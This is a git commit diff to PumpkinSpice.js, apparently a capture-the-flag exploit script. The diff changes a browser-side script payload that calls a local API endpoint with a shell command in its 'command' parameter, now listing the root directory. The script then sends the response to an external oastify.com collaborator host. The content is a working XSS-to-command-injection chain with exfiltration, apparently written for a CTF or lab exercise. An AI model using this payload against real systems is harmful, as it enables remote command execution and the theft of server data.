3a7a3b936a72023e67d0349daddb16be6cf7df22
jellyf15h <86880362+jellyf15h@users.noreply.github.com>
2024-05-15 17:05:35 -0700

    Update PumpkinSpice.js

--- PumpkinSpice.js
+++ PumpkinSpice.js
@@ -1,5 +1,5 @@
 <script>
-fetch("http://127.0.0.1:1337/api/stats?command=ls").then((r) => {
+fetch("http://127.0.0.1:1337/api/stats?command=ls+/").then((r) => {
     return r.text();
 }).then((x) => {
     fetch("http://rhckcwis5voitardnysarlzp9gf733rs.oastify.com/submit", {
